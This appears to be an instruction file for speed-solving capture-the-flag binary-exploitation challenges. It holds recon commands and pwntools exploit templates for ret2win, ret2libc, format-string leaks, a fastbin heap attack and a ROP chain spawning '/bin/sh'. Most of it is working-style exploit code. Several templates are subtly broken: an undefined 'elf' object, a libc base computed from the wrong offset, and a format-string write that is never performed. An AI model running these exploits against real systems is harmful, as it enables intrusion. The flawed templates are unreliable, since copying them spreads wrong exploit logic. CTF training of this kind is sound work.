# CTF Binary Exploitation (PWN) Skill

## Speed-First Approach: Solve pwn challenges in <15 minutes

### Phase 1: Instant Recon (<2 minutes)
```bash
# Run this immediately on any binary challenge
FILE=$1

# Basic info
file $FILE
checksec --file=$FILE 2>/dev/null || readelf -l $FILE | grep GNU_STACK

# Quick strings (flag patterns)
strings $FILE | grep -iE 'flag\{|ctf\{|CTF\{|FLAG\{'
strings -n8 $FILE | head -30

# Interesting functions
objdump -d $FILE | grep -E '<(main|vuln|win|flag|system|gets|printf|scanf|puts|read|write)@plt>'

# Libc version
ldd $FILE 2>/dev/null
ldd $FILE | grep libc

# Binary protections
echo "=== RELRO ===" && readelf -l $FILE | grep GNU_RELRO
echo "=== Stack Canary ===" && readelf -s $FILE | grep __stack_chk_fail
echo "=== NX ===" && readelf -l $FILE | grep GNU_STACK
echo "=== PIE ===" && readelf -h $FILE | grep Type
echo "=== FORTIFY ===" && readelf -s $FILE | grep __fprintf_chk
```

### Phase 2: Vulnerability Detection (<3 minutes)
```bash
# Quick function analysis
objdump -d $FILE | grep -B5 -A20 '<main>:'
objdump -d $FILE | grep -B5 -A20 '<vuln>:'
objdump -d $FILE | grep -B5 -A20 '<win>:'
objdump -d $FILE | grep -B5 -A20 '<flag>:'

# Look for dangerous functions
objdump -d $FILE | grep -E '<(gets|strcpy|strcat|sprintf|scanf|printf)@plt>'

# Check for format string
strings $FILE | grep '%s\|%x\|%d\|%n'

# Check for stack buffer
grep -E 'sub.*\$0x[0-9a-f]+,%rsp' <(objdump -d $FILE)

# ROP gadgets
ROPgadget --binary $FILE --ropchain 2>/dev/null | head -20
ropper --file $FILE --search "pop rdi" 2>/dev/null | head -10
```

### Phase 3: Choose Attack Strategy
```
SELECT attack based on protections:
├── No canary, no PIE, no NX → ret2win (direct return to win function)
├── No canary, no PIE, NX → ret2libc (return to system)
├── No canary, PIE, NX → leak libc base, then ret2libc
├── Canary, no PIE → format string to leak canary, then overwrite
├── Canary, PIE → leak canary + PIE base, then ret2libc
└── Full protections → ret2dlresolve or SROP
```

## One-Liner Solvers

### ret2win (Simplest)
```python
from pwn import *
context.arch = 'amd64'
p = remote('HOST', PORT)
# or p = process('./binary')

# Find win function address
win_addr = 0x401186  # From objdump

# Simple buffer overflow
payload = b'A' * 72 + p64(win_addr)  # Adjust padding based on buffer size
p.sendline(payload)
p.interactive()
```

### ret2libc
```python
from pwn import *
context.arch = 'amd64'
context.log_level = 'debug'

p = remote('HOST', PORT)

# Find gadgets
pop_rdi = 0x401186  # pop rdi; ret
ret = 0x40101a       # ret (for alignment)

# Libc offsets (from libc database or local libc)
system_offset = 0x55410
bin_sh_offset = 0x1b75aa
__libc_start_main_offset = 0x270b3

# Leak libc base
payload = b'A' * 72
payload += p64(pop_rdi)
payload += p64(elf.got['puts'])  # GOT entry for puts
payload += p64(elf.plt['puts'])  # PLT entry for puts
payload += p64(elf.symbols['main'])  # Return to main

p.sendline(payload)
p.recvuntil(b'\n')

# Parse leaked address
puts_leak = u64(p.recvline().strip().ljust(8, b'\x00'))
libc_base = puts_leak - system_offset
system_addr = libc_base + system_offset
bin_sh_addr = libc_base + bin_sh_offset

# Now call system("/bin/sh")
payload2 = b'A' * 72
payload2 += p64(ret)  # Stack alignment
payload2 += p64(pop_rdi)
payload2 += p64(bin_sh_addr)
payload2 += p64(system_addr)

p.sendline(payload2)
p.interactive()
```

### Format String Attack
```python
from pwn import *
context.arch = 'amd64'

p = remote('HOST', PORT)

# Leak canary and libc
# Try different offsets: %7$p, %8$p, %9$p...
for i in range(7, 20):
    p.sendline(f'%{i}$p'.encode())
    result = p.recvline()
    print(f'Offset {i}: {result}')

# After finding canary offset (usually offset 7-15 on x86_64)
canary_offset = 11
p.sendline(f'%{canary_offset}$p'.encode())
canary = int(p.recvline(), 16)

# Overwrite return address
payload = b'A' * 72
payload += p64(canary)  # Save canary
payload += b'B' * 8    # Saved RBP
payload += p64(win_addr)  # Overwrite return address

# Use format string to write
# %<n>c%<offset>$hn to write short
# %<n>c%<offset>$n to write byte
```

### Heap Exploitation - Fastbin Attack
```python
from pwn import *
context.arch = 'amd64'

p = remote('HOST', PORT)

# Allocate chunks
p.sendlineafter(b'> ', b'1')  # malloc
p.sendlineafter(b'size: ', b'32')
p.recvuntil(b'ptr: ')
chunk1 = int(p.recvline(), 16)

p.sendlineafter(b'> ', b'1')  # malloc
p.sendlineafter(b'size: ', b'32')
p.recvuntil(b'ptr: ')
chunk2 = int(p.recvline(), 16)

# Free chunk (goes into fastbin)
p.sendlineafter(b'> ', b'2')  # free
p.sendlineafter(b'ptr: ', p64(chunk1))

# Allocate from fastbin with forged size
p.sendlineafter(b'> ', b'1')  # malloc
p.sendlineafter(b'size: ', b'32')

# Write to overlapping memory
payload = b'A' * 16 + p64(0) + p64(0x41)  # Fake chunk header
p.sendlineafter(b'data: ', payload)

# Now allocate the fake chunk
p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'size: ', b'48')
```

## GDB Quick Commands

### Essential GDB for PWN
```bash
# Start with GDB
gdb ./binary

# Set breakpoints
b main
b *main+123
b vuln

# Run with args
r $(python3 -c 'print("A"*100)')

# Examine memory
x/20x $rsp          # 20 hex words at stack pointer
x/s 0x401234        # String at address
x/i $rip            # Current instruction

# Examine registers
info registers rax rbx rcx rdx rdi rsi

# Examine GOT/PLT
x/10x 0x404000      # GOT entries
disas main           # Disassemble main

# Find useful values
find /b 0x400000, 0x405000, "/bin/sh"
search-pattern "flag" 0x400000 0x405000

# Pwndbg specific
heap               # Heap chunks
bins               # Free bins
got                # GOT table
vmmap              # Memory map
telescope $rsp 20  # Smart memory view
```

### Automated GDB Script
```python
# gdb_script.py
import gdb

class PwnHelper(gdb.Command):
    def __init__(self):
        super().__init__("pwn", gdb.COMMAND_USER)
    
    def invoke(self, arg, from_tty):
        if arg == "leak":
            # Leak stack, canary, libc
            gdb.execute("x/20x $rsp")
            gdb.execute("x/gx $rsp+72")  # Canary (offset may vary)
            gdb.execute("x/gx $rsp+80")  # Saved RBP
            gdb.execute("x/gx $rsp+88")  # Return address
        elif arg == "check":
            # Check protections
            gdb.execute("info proc mappings")
        
PwnHelper()
```

## Libc Database Lookup

### Manual libc Identification
```bash
# Leak puts address, find libc version
# Use: https://libc.rip/ or https://github.com/niklasb/libc-database

# Download libc-database
git clone https://github.com/niklasb/libc-database.git
cd libc-database

# Search for libc
./find puts 0x7ffff7a5c990

# Or use online: https://libc.rip/
# Enter: function name + leaked address
```

### Automated libc lookup
```python
import requests

def find_libc(function_name, address):
    """Find libc version from leaked address"""
    url = f"https://libc.rip/api/find"
    data = {"symbols": {function_name: hex(address)}}
    r = requests.post(url, json=data)
    return r.json()

# Usage
results = find_libc("puts", 0x7ffff7a5c990)
for lib in results[:3]:
    print(f"{lib['id']}: {lib['buildid']}")
```

## ROP Chain Builder

### Automated ROPgadget Usage
```bash
# Find all useful gadgets
ROPgadget --binary $FILE > gadgets.txt

# Find specific gadgets
ROPgadget --binary $FILE | grep "pop rdi"
ROPgadget --binary $FILE | grep "pop rsi"
ROPgadget --binary $FILE | grep "pop rdx"
ROPgadget --binary $FILE | grep "pop rax"
ROPgadget --binary $FILE | grep "syscall"
ROPgadget --binary $FILE | grep "ret"

# Generate ROP chain
ROPgadget --binary $FILE --ropchain

# Use ropper
ropper --file $FILE --search "pop rdi; ret"
ropper --file $FILE --search "pop rsi; pop r15; ret"  # __libc_csu_init gadgets
```

### ROP Chain Templates
```python
# execve("/bin/sh", NULL, NULL)
from pwn import *

context.arch = 'amd64'

def create_rop_chain(binary):
    elf = ELF(binary)
    
    # Gadgets (adjust addresses)
    pop_rdi = 0x401186  # pop rdi; ret
    pop_rsi_r15 = 0x401184  # pop rsi; pop r15; ret
    pop_rdx = 0x401182  # pop rdx; ret (or use csu)
    syscall = 0x40118a  # syscall; ret
    
    rop = ROP(elf)
    
    # execve("/bin/sh", 0, 0)
    rop.raw(pop_rdi)
    rop.raw(next(elf.search(b'/bin/sh')))
    rop.raw(pop_rsi_r15)
    rop.raw(0)
    rop.raw(0)
    rop.raw(pop_rdx)
    rop.raw(0)
    rop.raw(rop.find_gadget(['pop rax', 'ret'])[0])
    rop.raw(59)  # SYS_execve
    rop.raw(syscall)
    
    return rop.chain()
```

## Common Vulnerability Patterns

### Stack Buffer Overflow
```
Detection: gets(), strcpy(), strcat(), sprintf(), scanf("%s")
Exploit:
1. Find buffer size (gdb: break after input, check $rsp)
2. Overflow saved RBP (buffer + 8)
3. Overwrite return address (buffer + 16 on x64)
4. Chain: pop rdi; ret → addr of "/bin/sh" → system()
```

### Format String
```
Detection: printf(user_input), sprintf(buf, user_input)
Exploit:
1. Leak canary: %7$p (offset varies)
2. Leak libc: %9$p (usually __libc_start_main+xxx)
3. Leak PIE: %11$p (usually main+xxx)
4. Write: %n (4 bytes), %hn (2 bytes), %hhn (1 byte)
5. Overwrite GOT entry: write target address to GOT[puts]
```

### Heap Overflow
```
Detection: malloc() + gets()/read() without size check
Exploit:
1. Fastbin attack: free chunk → overwrite fd pointer → allocate at target
2. Tcache poisoning: similar to fastbin but with tcache
3. House of Force: overwrite top chunk size → malloc at arbitrary address
4. House of Spirit: fake chunk on stack → free → allocate at stack
```

### Use-After-Free
```
Detection: free() without setting pointer to NULL
Exploit:
1. Allocate chunk (contains function pointer)
2. Free chunk (goes into free list)
3. Allocate new chunk (reuses same memory)
4. Overwrite function pointer
5. Trigger function call → redirect to shellcode/win
```

### Integer Overflow
```
Detection: malloc(size * count) without overflow check
Exploit:
1. Find overflow point (e.g., 0x100 * 0x1000000 = 0)
2. Allocate small buffer with large size
3. Overflow into adjacent memory
4. Overwrite control structures
```

## Speed Metrics
```
Average solve times (target):
- ret2win: <3 minutes
- ret2libc: <5 minutes
- Format string leak: <5 minutes
- Fastbin attack: <10 minutes
- Tcache poisoning: <10 minutes
- Complex heap: <15 minutes
```
